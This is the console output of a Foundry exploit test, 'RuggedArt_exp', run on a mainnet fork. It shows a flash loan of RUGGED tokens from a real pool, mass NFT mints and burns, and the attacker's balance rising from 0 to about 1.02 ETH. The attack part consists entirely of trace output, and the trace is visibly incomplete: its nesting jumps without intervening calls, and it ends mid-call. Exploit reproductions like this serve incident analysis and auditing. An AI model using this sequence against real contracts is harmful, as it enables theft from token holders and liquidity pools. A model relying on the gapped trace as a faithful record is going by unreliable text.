No files changed, compilation skipped

Ran 1 test for test/RuggedArt_exp.sol:ContractTest
[PASS] testExploit() (gas: 7102116)
Logs:
  Attacker Eth balance before attack:: 0
  Attacker Eth balance after attack:: 1023851896415447765

Traces:
  [19491] ContractTest::setUp()
    ├─ [0] VM::createSelectFork("mainnet", 19262233 [1.926e7])
    │   └─ ← [Return] 0
    ├─ [0] VM::label(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], "proxy")
    │   └─ ← [Return]
    ├─ [0] VM::label(RUGGED: [0xbE33F57f41a20b2f00DEc91DcC1169597f36221F], "RUGGED")
    │   └─ ← [Return]
    ├─ [0] VM::label(pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5], "pool")
    │   └─ ← [Return]
    ├─ [0] VM::label(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], "WETH")
    │   └─ ← [Return]
    ├─ [0] VM::label(RuggedMarket: [0xFe380fe1DB07e531E3519b9AE3EA9f7888CE20C6], "RuggedMarket")
    │   └─ ← [Return]
    ├─ [0] VM::label(Universal_Router: [0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD], "Universal_Router")
    │   └─ ← [Return]
    └─ ← [Stop]

  [8882910] ContractTest::testExploit()
    ├─ [2534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] 0x0000000000000000000000000000000000000000::fallback()
    │   └─ ← [Stop]
    ├─ [0] VM::deal(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
    │   └─ ← [Return]
    ├─ [534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "Attacker Eth balance before attack:", val: 0)
    ├─ [8216165] pool::flash(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 22000000000000000000 [2.2e19], 0, 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [2630] RUGGED::balanceOf(pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5]) [staticcall]
    │   │   └─ ← [Return] 356565570739218611936 [3.565e20]
    │   ├─ [2534] WETH::balanceOf(pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5]) [staticcall]
    │   │   └─ ← [Return] 21357138155001948655 [2.135e19]
    │   ├─ [2315335] RUGGED::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 22000000000000000000 [2.2e19])
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9159)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9004)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3270)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 8866)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 347)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9050)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3033)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 41)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 7485)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9192)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 1933)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9017)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 7093)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 4090)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3525)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3978)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 4984)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 7449)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3913)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 6049)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 8796)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 4903)
    │   │   ├─ emit ERC20Transfer(from: pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 22000000000000000000 [2.2e19])
    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: 0x0000000000000000000000000000000000000000, tokenId: 8655)
    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: 0x0000000000000000000000000000000000000000, tokenId: 4039)
    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: 0x0000000000000000000000000000000000000000, tokenId: 5458)
    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: 0x0000000000000000000000000000000000000000, tokenId: 7637)
    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: 0x0000000000000000000000000000000000000000, tokenId: 5676)
    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: 0x0000000000000000000000000000000000000000, tokenId: 5717)
    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: 0x0000000000000000000000000000000000000000, tokenId: 5367)
    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: 0x0000000000000000000000000000000000000000, tokenId: 4810)
    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: 0x0000000000000000000000000000000000000000, tokenId: 4574)
    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: 0x0000000000000000000000000000000000000000, tokenId: 4011)
    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: 0x0000000000000000000000000000000000000000, tokenId: 2314)
    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: 0x0000000000000000000000000000000000000000, tokenId: 5862)
    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: 0x0000000000000000000000000000000000000000, tokenId: 1769)
    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: 0x0000000000000000000000000000000000000000, tokenId: 9848)
    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: 0x0000000000000000000000000000000000000000, tokenId: 9792)
    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: 0x0000000000000000000000000000000000000000, tokenId: 9577)
    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3270)
    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 8866)
    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 347)
    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9050)
    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3033)
    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 41)
    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 7485)
    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9192)
    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 1933)
    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9017)
    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 7093)
    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 4090)
    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3525)
    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3978)
    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 4984)
    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 7449)
    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3913)
    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 6049)
    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 8796)
    │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 4903)
    │   │   │   │   │   ├─ emit ERC20Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 20000000000000000000 [2e19])
    │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   @ 0x509055df01107bc64af72dc08330b9397ce32ea3183e634e399c3833b7aa595e: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e6e: 347 → 9848
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606dc: 338 → 0
    │   │   │   │   │   │   @ 0x5d2b15e8f5f815fb50b5b7a25cacff81404ca066c26d5e2169c5ae3b4e19e56b: 1 → 0
    │   │   │   │   │   │   @ 0x0c4a44ce34df80952148b7b55c7e8acaf6e91b820b49391d0f0a2b34d035ba0c: 500 → 0
    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da3: 0 → 9050
    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da4: 0 → 3033
    │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4c33: 41 → 2314
    │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb3e62: 9017 → 5367
    │   │   │   │   │   │   @ 0x1214a60f33c6391325f4fe835803e25bbbc9ab9ba21d99ebf959d2fd32d9d52e: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   │   │   │   @ 0xdc546f96e41e999be4708cb6101a04d8f998356cd939cdf7cc4d0a8fa5af457b: 0 → 1
    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2dac: 0 → 3525
    │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001bd9e8ef4048bcb841 → 0x00000000000000000000000000000000000000000000001ac45aa93734ecb841
    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da7: 0 → 9192
    │   │   │   │   │   │   @ 0x43b2386d4d3972d2f65d70f347e567d6b0c366ab6fb9eb781c2f1d30d6b1d7e5: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   │   │   │   @ 0xc3c7fb6a95b80182ab6b591f943a09f0ce415e4da4e0ecaf98679ba9df432a6d: 497 → 0
    │   │   │   │   │   │   @ 0x86687c7176d6ec32d7764f9b1443646d5ccf88d0ed3954d868774dc2cd878cfe: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0
    │   │   │   │   │   │   @ 0x61042a91e6bf866457bba3c0e1666b25163b3849470db2bebc37920294f5c189: 0 → 1
    │   │   │   │   │   │   @ 0xe7ce429ac7a3c0c4496332bad5eb5dffe331e40b2a4c50def06dcc0d6027a874: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   │   │   │   @ 0xbe2c3a487941f55e5881f06652a276fbd45a3685be1c48f42264468f7c028a36: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0
    │   │   │   │   │   │   @ 0x201eefa0b4934df22afa051a4a9c50a1a60812f397c2287f31526961a63e7648: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   │   │   │   @ 0x9c21bc71da0e484dfd35ad2a10d338fedd95a67f06d8e39198816abf0c9b1168: 0 → 27
    │   │   │   │   │   │   @ 0xfbf57951a20a7af7daeefa1d2d90f0cd061fcf465fe6b720b4ff482e80709475: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   │   │   │   @ 0x754c3d23b53fe0c86c15828a5ac606752c899fa8175b595783936f2a9b59c3df: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   │   │   │   @ 0xfb65761e2b328a03a36b8f31e9431fb9096b55c3bf735d6531838cc6e005e1fc: 505 → 0
    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2daa: 0 → 7093
    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da9: 0 → 9017
    │   │   │   │   │   │   @ 0xff842230989f970b5f317b3598e2868dfc6e1bc70472a2e69470aa6da7b9a1f9: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606d2: 4011 → 0
    │   │   │   │   │   │   @ 0xd688421fed0da63bb41748eaebc09adf1b400e13d1eadd1583aaef2e7b2c03cf: 0 → 24
    │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4bce: 3913 → 338
    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2db2: 0 → 8796
    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2dab: 0 → 4090
    │   │   │   │   │   │   @ 0x6a71dca57933fa17eee14913cde5265fb9e89923a9146e65eb6c63cec9c9a91e: 0 → 1
    │   │   │   │   │   │   @ 0x36bb8b7d694abd1ddcfd6ad0e40c7f1bb98463dfcb3f63c4d8ea061ef08403b2: 0 → 29
    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2db0: 0 → 3913
    │   │   │   │   │   │   @ 0xa44cf8214680f4e1a824e25b8c3300bef5773bde0bd01e6b84e832bf6653012c: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0
    │   │   │   │   │   │   @ 0xcc2c5c17b159d60d905b954901e7a94ae9978f5d8ea9527f13bcd28ff7a38b73: 0 → 35
    │   │   │   │   │   │   @ 0x96cf7746f18a97cf11d1e4d88837e1786085500ea82c421d7cdbd15759a9d51e: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   │   │   │   @ 0xa9c8473723def7a8ce3ea8bfb784a667951a62cb70ea5379a81bc26ea5519df6: 0 → 20
    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da1: 0 → 8866
    │   │   │   │   │   │   @ 0x56eff69ceea4ed7dc108bc9b4b6869a9d8c43c7c7167557b35cc5dd6e095b85d: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0
    │   │   │   │   │   │   @ 0x2e7bf30fc8c8d5ec435867d0c613e08548fd6c252f87bd72fa806b75ef9eb9f1: 1 → 0
    │   │   │   │   │   │   @ 0x47a92aee51ae5fb9a8dbf64361d3f29bfe75ae230c138247702116a4244ffaa1: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   │   │   │   @ 0xc921984d2c33a69f8375f086d9b3a96627202e9779634ae9c1a69f69a45f58d8: 511 → 0
    │   │   │   │   │   │   @ 0xb7cc3f2e7844e64cd1d924b873790896754a275358b786ac1ba5dc726cd4fd88: 1 → 0
    │   │   │   │   │   │   @ 0xa29d45e22a9a0f30d38df49c200ba922d7536c11836487ef7c1358d984142409: 510 → 0
    │   │   │   │   │   │   @ 0xbbe1eab42e196d0b085936a6eebd5fc27628079e1c2a436cce03020d394c295f: 506 → 0
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606d0: 5862 → 0
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606db: 8655 → 0
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606d9: 5458 → 0
    │   │   │   │   │   │   @ 0xb9cdf88b8d8f3e02e247d6babc82904403029ae5cea1bcd019e7d104eba05f45: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0
    │   │   │   │   │   │   @ 0x2d015ef0357f85f216b2e8c1b54273d960fdb9b3d9f4e846e824345a939f94aa: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   │   │   │   @ 0x36822dd15940f1efccfbc62c0ff56967efaf9783a99f51ad14a05140cb0a430b: 0 → 1
    │   │   │   │   │   │   @ 0x770feb3423151f21403e86d4f8cc8f50a4ad771df31647cb866e27d00502c0c1: 1 → 0
    │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb414d: 4984 → 4039
    │   │   │   │   │   │   @ 0xf403129ad72c5f3e78204716d3c5c26cbba1cfa7d9cceb2222765bacfb489763: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   │   │   │   @ 0xcbe6aea63eaeb3e182c411c5b40221ff01f55667ecf57e7c7128fac6e25e2b71: 1 → 0
    │   │   │   │   │   │   @ 0x5b053a6f0242520d4e5daa90fe6eddb38b2e7d2afe6575e476efb712b763e344: 0 → 39
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606d4: 4810 → 0
    │   │   │   │   │   │   @ 0x593b9d14d50e92a65df8d78640350d8ddcd444024c2cc502610aac7c5d87a431: 0 → 30
    │   │   │   │   │   │   @ 0x3a3d7165046fe6a416c679e65f8a794a793ab4c932d5805fb6301e006ef54021: 499 → 0
    │   │   │   │   │   │   @ 0x6954541263162baed709c02b1958d5d53bc4ca664d181f4de4544acb26f18a9c: 1 → 0
    │   │   │   │   │   │   @ 0xed328d2bb428e8669bc7cffac36f7bfa7be91b9f3cf6909ec4029ad835946798: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da2: 0 → 347
    │   │   │   │   │   │   @ 0x51d81e7164cbe709527ea8caa824727bc4e31084732f294382d09f739085b019: 1 → 0
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606d5: 5367 → 0
    │   │   │   │   │   │   @ 0xd9f0ab2dde70205bf43c828029343c0e47e215095e2b6694cc4c6170cf031138: 512 → 0
    │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb46f2: 8866 → 9792
    │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb43ac: 6049 → 9264
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606d7: 5676 → 0
    │   │   │   │   │   │   @ 0xc75099ea203e179b5fed28a847cb830059ddef10f334d856ccf9250c338c1258: 0 → 22
    │   │   │   │   │   │   @ 0x096ddad3bfdd3ba6526f0b7845c553d531ca1974fe09161b209eeb3c1cf14169: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0
    │   │   │   │   │   │   @ 0x73df13df11fdd98e14c62b0277be82bee99cc611468e3b7ae57fafca6b691787: 1 → 0
    │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4215: 7449 → 8655
    │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4b8f: 3525 → 7637
    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2dae: 0 → 4984
    │   │   │   │   │   │   @ 0xa76eb3f731976f4f5aa42c8333a8ac99dc5590fc54deaf08ec4561495bc01f83: 1 → 0
    │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x00000000000000000000000000000000000000000000000116b317929e51d200 → 0x0000000000000000000000000000000000000000000000022c415d9bb221d200
    │   │   │   │   │   │   @ 0xd3de864699c49dd73fbc1f9e1cb65cc5761d6378b5d5927db2f6a6be3fe931ef: 0 → 38
    │   │   │   │   │   │   @ 0x4af2d71d62c778d8266ef9eb560af5aa17a48df876ed565035d1482852b6d9cc: 495 → 0
    │   │   │   │   │   │   @ 0x3e85fa78b888a9a70b16d8b2ffd5a5ce13ee49b9cf26488c0be4f968132d0c5f: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0
    │   │   │   │   │   │   @ 0x16d4236f8135b486684a8fac3481a9cf3bb5748669ffb02a03afa726d60d00f8: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   │   │   │   @ 0xd9379a4d2df17ecad725133e46dbfa3a48f8df77dd941acd4d8666c461a1777d: 0 → 1
    │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4c87: 3033 → 5862
    │   │   │   │   │   │   @ 0xdc020bd6a71f163563b7d66e645c0eeb6f4898caf381861ae2efab5dadd03e6a: 507 → 0
    │   │   │   │   │   │   @ 0x1b137e43b0e30898156d4dbd1f04e48bffecac6b87d788f4d716dc4cedc28e45: 0 → 28
    │   │   │   │   │   │   @ 0x2bf44c59b7dfa0b983853ab9a9df75d73a6c3f25f352c17ef5841d15c33e5a8d: 0 → 31
    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2db1: 0 → 6049
    │   │   │   │   │   │   @ 0x85d1cb275c2136a6bc7b677be74095b987fa5bea8e98e1dd65cdcf3ecfa7abaa: 509 → 0
    │   │   │   │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb42f2: 9192 → 4574
    │   │   │   │   │   │   @ 0x834da7317bb7b7ccf158a7d5f3903b4af4b2510b4dd6b19986c59d415502b531: 502 → 0
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606dd: 9264 → 0
    │   │   │   │   │   │   @ 0x05f66b790f72b03c9bbe6651b5b5cbe30b3506b439b5997494249d06fe1e63ca: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0
